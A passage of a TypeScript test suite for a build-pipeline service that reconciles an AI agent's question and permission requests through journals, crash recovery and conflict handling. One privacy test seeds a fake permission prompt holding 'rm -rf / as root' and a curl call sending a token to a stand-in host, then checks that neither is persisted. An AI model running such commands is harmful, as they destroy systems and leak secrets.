      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          requests = [];
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      const concurrentStorage = new StorageService(controls.dataDir);
      await concurrentStorage.init();
      const originalSave = storage.saveBuildPipeline.bind(storage);
      let diverted = false;
      storage.saveBuildPipeline = async (...args) => {
        const candidate = args[4] as BuildPipeline;
        const isOutcomeSave = candidate.pendingInteractionResolution === undefined
          && candidate.sessions.some((entry) =>
            entry.interactionTranscript?.some((item) => item.id === request.id));
        if (isOutcomeSave && !diverted) {
          diverted = true;
          // Another backend has already claimed a different interaction into
          // the envelope, so this outcome no longer describes what is on disk.
          await mutateStored(concurrentStorage, started.id, (snapshot) => {
            snapshot.pendingInteractionResolution = {
              ...snapshot.pendingInteractionResolution!,
              journalId: "a-newer-journal-claim",
            };
          });
        }
        return originalSave(...args);
      };
      try {
        await service.advanceNow(started.id);

        const parked = await pipeline(storage, started.id);
        expect(parked.phase).toBe("building");
        expect(parked.error)
          .toContain("could not be merged into the current pipeline generation");
        expect(parked.pendingInteractionResolution?.journalId)
          .toBe("a-newer-journal-claim");
      } finally {
        storage.saveBuildPipeline = originalSave;
      }
    });
  });

  test("rethrows a pending-envelope conflict no other writer explains", async () => {
    await withService(async (service, storage, provider, _invocations, controls) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "unmergeable-envelope-question");
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      const concurrentStorage = new StorageService(controls.dataDir);
      await concurrentStorage.init();
      const originalSave = storage.saveBuildPipeline.bind(storage);
      let diverted = false;
      storage.saveBuildPipeline = async (...args) => {
        const candidate = args[4] as BuildPipeline;
        if (
          !diverted
          && candidate.pendingInteractionResolution?.interactionId === request.id
        ) {
          diverted = true;
          // An unrelated concurrent write: the envelope is neither on disk nor
          // durably resolved, so the loss is real and must surface.
          await mutateStored(concurrentStorage, started.id, (snapshot) => {
            snapshot.pendingUserMessages = [{
              id: "concurrent-message",
              text: "An unrelated concurrent write",
              createdAt: new Date().toISOString(),
            }];
          });
        }
        return originalSave(...args);
      };
      try {
        await service.advanceNow(started.id);

        expect(resolveCalls).toBe(0);
        expect(await pipeline(storage, started.id)).toMatchObject({
          phase: "failed",
          error: "Build pipeline revision conflict",
        });
        expect((await storage.getAgentInteractionResolutionJournal()).entries)
          .toContainEqual(expect.objectContaining({
            interactionId: request.id,
            state: "claimed",
          }));
      } finally {
        storage.saveBuildPipeline = originalSave;
      }
    });
  });

  test("reconnects rather than answering an interaction from an inactive generation", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "inactive-generation-question");
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      await mutateStored(storage, started.id, (snapshot) => {
        snapshot.pendingInteractionResolution = {
          ...pendingEnvelope(session, request, "inactive-journal", Date.now()),
          sessionKey: `${session.sessionKey}-superseded`,
        };
      });

      await service.advanceNow(started.id);

      expect(resolveCalls).toBe(0);
      const parked = await pipeline(storage, started.id);
      expect(parked.phase).toBe("building");
      expect(parked.error)
        .toContain("belongs to an inactive pipeline generation");
      expect(parked.reconnectAttempt).toBeDefined();
    });
  });

  test("reconnects when an existing claim names a different workflow generation", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "foreign-fence-question");
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "foreign-fence-journal",
          interactionId: request.id,
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "claimed",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            // A stage that has since been restarted owns this claim.
            fence: "a-superseded-session-key",
            claimedAt: Date.now(),
          },
        }],
      }));

      await service.advanceNow(started.id);

      expect(resolveCalls).toBe(0);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "building",
        error: expect.stringContaining("belongs to a different workflow generation"),
      });
    });
  });

  test("reconnects when a terminal interaction reappears at the provider", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "reappearing-question");
      const claimedAt = Date.now();
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "terminal-journal",
          interactionId: request.id,
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "workflow-recorded",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt,
          },
          outcome: "auto-declined",
          providerResolvedAt: claimedAt,
          workflowRecordedAt: claimedAt,
        }],
      }));

      await service.advanceNow(started.id);

      expect(resolveCalls).toBe(0);
      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "building",
        error: expect.stringContaining(
          "A terminal interaction unexpectedly reappeared at the provider",
        ),
      });
    });
  });

  test("fails a build whose interaction claim was lost without a durable outcome", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "lost-claim-question");
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      await mutateStored(storage, started.id, (snapshot) => {
        snapshot.pendingInteractionResolution = pendingEnvelope(
          session,
          request,
          "a-journal-entry-that-was-dropped",
          Date.now(),
        );
      });

      await service.advanceNow(started.id);

      expect(resolveCalls).toBe(0);
      const failed = await pipeline(storage, started.id);
      // Retention dropping the claim is not a transport problem, so this must
      // fail visibly rather than loop through reconnect.
      expect(failed).toMatchObject({
        phase: "failed",
        error: expect.stringContaining("could not be resolved safely"),
        failureContext: {
          phase: "building",
          kind: "interactive-request",
          sessionId: session.sdkSessionId,
          requestId: request.id,
        },
      });
      expect(failed.reconnectAttempt).toBeUndefined();
      expect(failed.pendingInteractionResolution).toBeUndefined();
    });
  });

  test("clears a lost-claim envelope whose outcome is already durable", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "durable-lost-claim-question");
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      const resolvedAt = Date.now();
      await mutateStored(storage, started.id, (snapshot) => {
        const current = snapshot.sessions[snapshot.currentSessionIndex]!;
        current.interactionTranscript = [{
          id: request.id,
          provider: "claude",
          kind: "question",
          phase: "build",
          requestedAt: request.createdAt,
          resolvedAt,
          outcome: "auto-declined-headless",
          title: request.presentation.title,
          questions: [],
        }];
        current.autoDeclineCount = 1;
        snapshot.autoDeclineCount = 1;
        snapshot.pendingInteractionResolution = pendingEnvelope(
          session,
          request,
          "a-journal-entry-that-was-dropped",
          resolvedAt,
        );
      });

      await service.advanceNow(started.id);

      expect(resolveCalls).toBe(0);
      const cleared = await pipeline(storage, started.id);
      expect(cleared).toMatchObject({ phase: "building", autoDeclineCount: 1 });
      expect(cleared.pendingInteractionResolution).toBeUndefined();
      expect(cleared.sessions[cleared.currentSessionIndex]?.interactionTranscript)
        .toEqual([expect.objectContaining({ id: request.id })]);
    });
  });

  test("reconnects when a merged outcome no longer has its pipeline session", async () => {
    await withService(async (service, storage, provider, _invocations, controls) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "orphaned-session-question");
      let requests = [request];
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          requests = [];
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      const concurrentStorage = new StorageService(controls.dataDir);
      await concurrentStorage.init();
      const originalSave = storage.saveBuildPipeline.bind(storage);
      let diverted = false;
      storage.saveBuildPipeline = async (...args) => {
        const candidate = args[4] as BuildPipeline;
        const isOutcomeSave = candidate.pendingInteractionResolution === undefined
          && candidate.sessions.some((entry) =>
            entry.interactionTranscript?.some((item) => item.id === request.id));
        if (isOutcomeSave && !diverted) {
          diverted = true;
          // The stage was restarted elsewhere, so the generation this outcome
          // belongs to is no longer part of the authoritative snapshot.
          await mutateStored(concurrentStorage, started.id, (snapshot) => {
            const restarted = snapshot.sessions[snapshot.currentSessionIndex]!;
            restarted.sessionKey = `${restarted.sessionKey}-restarted`;
          });
        }
        return originalSave(...args);
      };
      try {
        await service.advanceNow(started.id);

        expect(await pipeline(storage, started.id)).toMatchObject({
          phase: "building",
          error: expect.stringContaining(
            "The interaction belongs to an unavailable pipeline session",
          ),
        });
      } finally {
        storage.saveBuildPipeline = originalSave;
      }
    });
  });

  test("infers a terminal outcome when the request disappears before the lease", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "vanishing-question");
      const claimedAt = Date.now();
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "vanishing-journal",
          interactionId: request.id,
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "claimed",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt,
          },
        }],
      }));
      let listCalls = 0;
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          listCalls += 1;
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: listCalls,
            // Present while the presentation is built, gone by the time the
            // lease is held: the provider accepted a response before the crash.
            requests: listCalls === 1 ? [request] : [],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });

      await service.advanceNow(started.id);

      expect(listCalls).toBeGreaterThanOrEqual(2);
      expect(resolveCalls).toBe(0);
      const resolved = await pipeline(storage, started.id);
      expect(resolved).toMatchObject({ phase: "building", autoDeclineCount: 1 });
      expect(resolved.sessions[resolved.currentSessionIndex]?.interactionTranscript)
        .toEqual([expect.objectContaining({ id: request.id })]);
    });
  });

  for (const result of ["already-resolved", "stale"] as const) {
    for (const kind of ["question", "permission"] as const) {
      test(`reconciles an ${result} ${kind} to a terminal outcome once it is gone`, async () => {
        await withService(async (service, storage, provider) => {
          const { started, session } = await startBuilding(service, storage, {
            taskId: `task-${result}-${kind}`,
          });
          const request: AgentInteractionRequest = {
            ...pendingQuestion(session.sdkSessionId, `${result}-${kind}`),
            kind,
          };
          let requests = [request];
          let resolveCalls = 0;
          installInteractions(provider, {
            async listPendingInteractions() {
              return {
                version: AGENT_INTERACTION_CONTRACT_VERSION,
                revision: 1,
                requests,
              };
            },
            async resolveInteraction(sessionId, interactionId) {
              resolveCalls += 1;
              // The provider had already applied the response; the reconcile
              // read is the only evidence that it is terminal and not failed.
              requests = [];
              return { result, sessionId, interactionId, revision: 2 };
            },
          });

          await service.advanceNow(started.id);

          expect(resolveCalls).toBe(1);
          const resolved = await pipeline(storage, started.id);
          const journalEntry = (await storage.getAgentInteractionResolutionJournal())
            .entries.find((entry) => entry.interactionId === request.id);
          if (kind === "question") {
            expect(resolved).toMatchObject({
              phase: "building",
              autoDeclineCount: 1,
            });
            expect(journalEntry).toMatchObject({
              state: "workflow-recorded",
              outcome: "auto-declined",
            });
          } else {
            expect(resolved).toMatchObject({
              phase: "failed",
              error: expect.stringContaining("requested unexpected authorization"),
              failureContext: {
                kind: "interactive-request",
                requestId: request.id,
              },
            });
            expect(journalEntry).toMatchObject({
              state: "workflow-recorded",
              outcome: "denied",
            });
          }
        });
      });
    }
  }

  test("clears the pending envelope when the journal already holds the outcome", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "already-recorded-question");
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      const resolvedAt = Date.now();
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "already-recorded-journal",
          interactionId: request.id,
          provider: "claude",
          kind: "question",
          sessionId: session.sdkSessionId,
          state: "workflow-recorded",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt: resolvedAt,
          },
          outcome: "auto-declined",
          providerResolvedAt: resolvedAt,
          workflowRecordedAt: resolvedAt,
        }],
      }));
      await mutateStored(storage, started.id, (snapshot) => {
        const current = snapshot.sessions[snapshot.currentSessionIndex]!;
        current.interactionTranscript = [{
          id: request.id,
          provider: "claude",
          kind: "question",
          phase: "build",
          requestedAt: request.createdAt,
          resolvedAt,
          outcome: "auto-declined-headless",
          title: request.presentation.title,
          questions: [],
        }];
        current.autoDeclineCount = 1;
        snapshot.autoDeclineCount = 1;
        snapshot.pendingInteractionResolution = pendingEnvelope(
          session,
          request,
          "already-recorded-journal",
          resolvedAt,
        );
      });

      await service.advanceNow(started.id);

      expect(resolveCalls).toBe(0);
      const cleared = await pipeline(storage, started.id);
      expect(cleared).toMatchObject({ phase: "building", autoDeclineCount: 1 });
      expect(cleared.pendingInteractionResolution).toBeUndefined();
      expect(cleared.error).toBeUndefined();
      expect(cleared.sessions[cleared.currentSessionIndex]?.interactionTranscript)
        .toHaveLength(1);
    });
  });

  test("finishes only durably recorded build-pipeline journal entries on start", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "transcript-recorded-question");
      let requests = [request];
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          requests = [];
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      await service.advanceNow(started.id);
      expect((await pipeline(storage, started.id)).autoDeclineCount).toBe(1);

      // Reopen the crash window: the transcript is durable but the journal
      // write that follows it was lost. Its two neighbours must be left alone.
      const now = Date.now();
      await storage.updateAgentInteractionResolutionJournal((journal) => ({
        ...journal,
        entries: [
          ...journal.entries.map((entry) =>
            entry.interactionId === request.id
              ? {
                  ...entry,
                  state: "provider-resolved" as const,
                  workflowRecordedAt: undefined,
                }
              : entry),
          {
            id: "orphan-journal",
            interactionId: "orphan-question",
            provider: "claude" as const,
            kind: "question" as const,
            sessionId: session.sdkSessionId,
            state: "provider-resolved" as const,
            claim: {
              workflowType: "build-pipeline" as const,
              workflowId: "a-pipeline-that-no-longer-exists",
              phase: "building",
              fence: session.sessionKey,
              claimedAt: now - 1,
            },
            outcome: "auto-declined" as const,
            providerResolvedAt: now,
          },
          {
            id: "looped-review-journal",
            interactionId: "looped-review-question",
            provider: "claude" as const,
            kind: "question" as const,
            sessionId: session.sdkSessionId,
            state: "provider-resolved" as const,
            claim: {
              workflowType: "looped-review" as const,
              workflowId: started.id,
              phase: "building",
              fence: session.sessionKey,
              claimedAt: now - 1,
            },
            outcome: "auto-declined" as const,
            providerResolvedAt: now,
          },
        ],
      }));

      const restored = new BuildPipelineService(
        storage,
        async <T>(): Promise<T> => {
          throw new Error("Crash-boundary journal recovery must stay local");
        },
        { autoAdvance: false, provider: async () => provider },
      );
      try {
        await restored.init();

        const { entries } = await storage.getAgentInteractionResolutionJournal();
        expect(entries.find((entry) => entry.interactionId === request.id))
          .toMatchObject({ state: "workflow-recorded", outcome: "auto-declined" });
        expect(entries.find((entry) => entry.id === "orphan-journal"))
          .toMatchObject({ state: "provider-resolved" });
        expect(entries.find((entry) => entry.id === "looped-review-journal"))
          .toMatchObject({ state: "provider-resolved" });
      } finally {
        await restored.shutdown();
      }
    });
  });

  test("recovers a permission claim the provider no longer exposes and fails closed", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const claimedAt = Date.now();
      await storage.updateAgentInteractionResolutionJournal(() => ({
        version: AGENT_INTERACTION_JOURNAL_VERSION,
        entries: [{
          id: "recovered-permission-journal",
          interactionId: "recovered-permission",
          provider: "claude",
          kind: "permission",
          sessionId: session.sdkSessionId,
          state: "claimed",
          claim: {
            workflowType: "build-pipeline",
            workflowId: started.id,
            phase: "building",
            fence: session.sessionKey,
            claimedAt,
          },
        }],
      }));
      let resolveCalls = 0;
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [],
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          resolveCalls += 1;
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      const envelopes: PendingPipelineInteractionResolution[] = [];
      const originalSave = storage.saveBuildPipeline.bind(storage);
      storage.saveBuildPipeline = async (...args) => {
        const candidate = args[4] as BuildPipeline;
        if (candidate.pendingInteractionResolution) {
          envelopes.push(structuredClone(candidate.pendingInteractionResolution));
        }
        return originalSave(...args);
      };
      try {
        await service.advanceNow(started.id);

        expect(resolveCalls).toBe(0);
        expect(envelopes).toEqual([expect.objectContaining({
          journalId: "recovered-permission-journal",
          interactionId: "recovered-permission",
          action: "deny-and-fail",
          title: "Provider interaction recovered after restart",
        })]);
        expect(await pipeline(storage, started.id)).toMatchObject({
          phase: "failed",
          error: expect.stringContaining("requested unexpected authorization"),
          failureContext: {
            kind: "interactive-request",
            requestId: "recovered-permission",
          },
        });
      } finally {
        storage.saveBuildPipeline = originalSave;
      }
    });
  });

  test("keeps a resolved interaction when the journal bookkeeping write fails", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "bookkeeping-question");
      let requests = [request];
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          requests = [];
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      const originalUpdate = storage
        .updateAgentInteractionResolutionJournal.bind(storage);
      const originalGet = storage
        .getAgentInteractionResolutionJournal.bind(storage);
      storage.updateAgentInteractionResolutionJournal = async (update) => {
        // Fail only the final bookkeeping transition; the provider boundary is
        // already durable by then and start-up recovery repairs the journal.
        const projected = update(structuredClone(await originalGet()));
        if (projected.entries.some((entry) =>
          entry.interactionId === request.id
          && entry.state === "workflow-recorded"
        )) {
          throw new Error("The interaction journal is unavailable");
        }
        return originalUpdate(update);
      };
      try {
        await service.advanceNow(started.id);

        const resolved = await pipeline(storage, started.id);
        expect(resolved).toMatchObject({ phase: "building", autoDeclineCount: 1 });
        expect(resolved.error).toBeUndefined();
        expect(resolved.pendingInteractionResolution).toBeUndefined();
        expect(resolved.sessions[resolved.currentSessionIndex]?.interactionTranscript)
          .toEqual([expect.objectContaining({ id: request.id })]);
        expect((await storage.getAgentInteractionResolutionJournal()).entries)
          .toContainEqual(expect.objectContaining({
            interactionId: request.id,
            state: "provider-resolved",
          }));
      } finally {
        storage.updateAgentInteractionResolutionJournal = originalUpdate;
      }
    });
  });

  test("merges repeated interactions of one kind into a single summary entry", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const firstCreatedAt = Date.now() - 5_000;
      const first: AgentInteractionRequest = {
        ...pendingQuestion(session.sdkSessionId, "summary-question-1"),
        createdAt: firstCreatedAt,
        updatedAt: firstCreatedAt,
      };
      let requests = [
        first,
        pendingQuestion(session.sdkSessionId, "summary-question-2"),
      ];
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          requests = requests.filter((request) => request.id !== interactionId);
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });

      await service.advanceNow(started.id);
      const afterFirst = (await pipeline(storage, started.id)).interactionSummary;
      expect(afterFirst?.entries).toHaveLength(1);
      expect(afterFirst?.entries[0]).toMatchObject({
        provider: "claude",
        kind: "question",
        phase: "build",
        sessionId: session.sdkSessionId,
        outcome: "auto-declined",
        firstSeenAt: firstCreatedAt,
        count: 1,
      });

      await service.advanceNow(started.id);
      const merged = (await pipeline(storage, started.id)).interactionSummary;
      expect(merged?.entries).toHaveLength(1);
      // The earliest request keeps firstSeenAt and the latest resolution wins
      // lastResolvedAt, so one entry still bounds the whole run.
      expect(merged?.entries[0]?.count).toBe(2);
      expect(merged?.entries[0]?.firstSeenAt).toBe(firstCreatedAt);
      expect(merged?.entries[0]?.lastResolvedAt)
        .toBeGreaterThanOrEqual(afterFirst!.entries[0]!.lastResolvedAt!);
    });
  });

  test("folds a new interaction into a matching outcome at summary capacity", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "at-capacity-question");
      const seededAt = Date.now() - 60_000;
      await mutateStored(storage, started.id, (snapshot) => {
        const current = snapshot.sessions[snapshot.currentSessionIndex]!;
        current.interactionSummary = {
          version: AGENT_INTERACTION_SUMMARY_VERSION,
          entries: Array.from(
            { length: AGENT_INTERACTION_LIMITS.maxWorkflowSummaries },
            (_, index) => ({
              provider: "claude" as const,
              kind: "question" as const,
              phase: "build",
              sessionId: `seeded-session-${index}`,
              firstSeenAt: seededAt,
              lastResolvedAt: seededAt,
              // Exactly one seeded entry can absorb the new auto-decline.
              outcome: index === 7
                ? "auto-declined" as const
                : "denied" as const,
              count: 1,
            }),
          ),
        };
      });
      let requests = [request];
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          requests = [];
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });

      await service.advanceNow(started.id);

      const resolved = await pipeline(storage, started.id);
      const current = resolved.sessions[resolved.currentSessionIndex]!;
      expect(current.interactionSummary?.entries)
        .toHaveLength(AGENT_INTERACTION_LIMITS.maxWorkflowSummaries);
      expect(current.interactionSummary?.entries[7]).toMatchObject({
        sessionId: "seeded-session-7",
        outcome: "auto-declined",
        count: 2,
      });
      expect(current.interactionSummary?.entries[7]?.lastResolvedAt)
        .toBeGreaterThan(seededAt);
      expect(current.interactionSummary?.entries
        .filter((entry) => entry.count > 1)).toHaveLength(1);
      // Summary capacity is metadata-only; the transcript stays exact.
      expect(current.interactionTranscript)
        .toEqual([expect.objectContaining({ id: request.id })]);
    });
  });

  test("never persists a provider's authorization presentation in the envelope", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request: AgentInteractionRequest = {
        ...pendingQuestion(session.sdkSessionId, "authorization-privacy"),
        kind: "permission",
        presentation: {
          title: "Run rm -rf / as root",
          body: "curl https://example.invalid/leaked-token",
          questions: [{
            id: "confirm",
            prompt: "Approve the destructive command?",
            required: true,
            multiple: false,
            secret: false,
            allowFreeText: false,
            options: [{
              id: "approve",
              label: "Approve",
              providerValue: "leaked-provider-value",
            }],
          }],
        },
      };
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction() {
          // Ends the pass right after the envelope is persisted so the durable
          // presentation can be read back.
          throw new ProviderUnavailableError("claude bridge is unreachable");
        },
      });

      await service.advanceNow(started.id);

      const envelope = (await pipeline(storage, started.id))
        .pendingInteractionResolution!;
      expect(envelope.action).toBe("deny-and-fail");
      expect(envelope.title).toMatch(/^Unexpected .* authorization$/);
      expect(envelope.body).toBeUndefined();
      expect(envelope.questions).toEqual([]);
      expect(JSON.stringify(envelope)).not.toContain("rm -rf");
      expect(JSON.stringify(envelope)).not.toContain("leaked-token");
      expect(JSON.stringify(envelope)).not.toContain("leaked-provider-value");
    });
  });

  test("truncates an over-long decline presentation to the envelope bounds", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request: AgentInteractionRequest = {
        ...pendingQuestion(session.sdkSessionId, "oversized-question"),
        presentation: {
          title: "t".repeat(600),
          body: "b".repeat(2_000),
          questions: Array.from({ length: 6 }, (_, index) => ({
            id: `question-${index}`,
            prompt: "p".repeat(600),
            required: true,
            multiple: false,
            secret: false,
            allowFreeText: false,
            options: Array.from({ length: 10 }, (_, option) => ({
              id: `option-${option}`,
              label: "l".repeat(200),
              providerValue: `leaked-provider-value-${option}`,
            })),
          })),
        },
      };
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests: [request],
          };
        },
        async resolveInteraction() {
          throw new ProviderUnavailableError("claude bridge is unreachable");
        },
      });

      await service.advanceNow(started.id);

      const envelope = (await pipeline(storage, started.id))
        .pendingInteractionResolution!;
      expect(envelope.action).toBe("decline-and-continue");
      expect(envelope.title).toHaveLength(512);
      expect(envelope.title.endsWith("…")).toBe(true);
      expect(envelope.body).toHaveLength(1_024);
      expect(envelope.questions).toHaveLength(4);
      expect(envelope.questions[0]?.prompt).toHaveLength(512);
      expect(envelope.questions[0]?.options).toHaveLength(8);
      expect(envelope.questions[0]?.options[0]).toHaveLength(128);
      expect(JSON.stringify(envelope)).not.toContain("leaked-provider-value");
    });
  });

  test("logs interaction outcomes as metadata only", async () => {
    await withService(async (service, storage, provider) => {
      const { started, session } = await startBuilding(service, storage);
      const request = pendingQuestion(session.sdkSessionId, "logged-question");
      let requests = [request];
      installInteractions(provider, {
        async listPendingInteractions() {
          return {
            version: AGENT_INTERACTION_CONTRACT_VERSION,
            revision: 1,
            requests,
          };
        },
        async resolveInteraction(sessionId, interactionId) {
          requests = [];
          return { result: "applied", sessionId, interactionId, revision: 2 };
        },
      });
      const logged: unknown[][] = [];
      const originalInfo = console.info;
      console.info = ((...args: unknown[]) => {
        logged.push(args);
      }) as typeof console.info;
      try {
        await service.advanceNow(started.id);
      } finally {
        console.info = originalInfo;
      }

      const entry = logged.find((args) =>
        args[0] === "[build-pipeline] interaction resolved");
      expect(entry).toBeDefined();
      const payload = entry![1] as Record<string, unknown>;
      expect(Object.keys(payload).sort()).toEqual([
        "count", "kind", "latencyMs", "outcome", "phase", "provider",
      ]);
      expect(payload).toMatchObject({
        provider: "claude",
        kind: "question",
        phase: "build",
        outcome: "auto-declined",
        count: 1,
      });
      expect(payload.latencyMs as number).toBeGreaterThanOrEqual(0);
      const serialized = JSON.stringify(payload);
      expect(serialized).not.toContain(request.presentation.title);
      expect(serialized).not.toContain(session.sdkSessionId);
      expect(serialized).not.toContain(started.id);
    });
  });

  test("refuses to persist a structurally invalid pipeline snapshot", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      // A bridge answering with an empty session id would otherwise commit a
      // snapshot every later read rejects, hiding the pipeline permanently.
      provider.createSession = async () => "";

      await service.advanceNow(started.id);

      const refused = await pipeline(storage, started.id);
      expect(refused).toMatchObject({
        phase: "failed",
        error: `Refusing to persist an invalid build pipeline snapshot: ${started.id}`,
      });
      expect(refused.sessions).toEqual([]);
      expect(isBuildPipeline(refused)).toBe(true);
    });
  });

  test("rejects an interaction retry for a build with no interactive failure", async () => {
    await withService(async (service, storage) => {
      const { started } = await startBuilding(service, storage);
      await expect(service.retryInteractionFailure(started.id)).rejects.toThrow(
        "This build has no interactive request failure to retry",
      );
      expect((await pipeline(storage, started.id)).phase).toBe("building");

      await mutateStored(storage, started.id, (snapshot) => {
        snapshot.phase = "failed";
        snapshot.error = "The build session failed";
        snapshot.failureContext = {
          phase: "building",
          kind: "stage-transition",
